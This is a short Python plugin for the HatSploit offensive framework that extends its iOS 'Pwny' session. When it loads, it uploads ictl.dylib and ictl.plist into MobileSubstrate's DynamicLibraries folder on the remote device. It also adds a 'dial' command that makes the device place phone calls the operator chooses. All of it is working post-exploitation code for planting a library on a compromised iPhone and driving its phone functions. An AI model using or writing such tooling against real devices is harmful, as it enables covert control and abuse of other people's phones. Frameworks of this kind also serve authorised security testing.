"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.plugin import Plugin


class HatSploitPlugin(Plugin):
    dylib = '/Library/MobileSubstrate/DynamicLibraries/ictl.dylib'
    plist = '/Library/MobileSubstrate/DynamicLibraries/ictl.plist'

    details = {
        'Name': "Pwny ictl Plugin",
        'Plugin': "ictl",
        'Authors': [
            'Ivan Nikolsky (enty8080) - plugin developer',
        ],
        'Description': "Plugin called ictl for Apple iOS Pwny.",
    }

    commands = {
        'ictl': {
            'dial': {
                'Description': "Make a phone number call.",
                'Usage': "dial <number>",
                'MinArgs': 1,
            }
        }
    }

    def dial(self, argc, argv):
        self.print_process(f"Dialing {argv[1]}...")
        self.session.send_command(f"dial {argv[1]}")

    def load(self):
        self.print_process("Checking ictl installation...")

        if self.session.send_command(f'ls {self.dylib}', True) == self.dylib:
            if self.session.send_command(f'ls {self.plist}', True) == self.plist:
                return

        self.print_process("Installing ictl.dylib...")
        if not self.session.upload(self.session.pwny + 'data/ictl.dylib', self.dylib):
            self.print_error("Failed to install ictl.dylib!")
            return

        self.print_process("Installing ictl.plist...")
        if not self.session.upload(self.session.pwny + 'data/ictl.plist', self.plist):
            self.print_error("Failed to install ictl.plist!")
            return
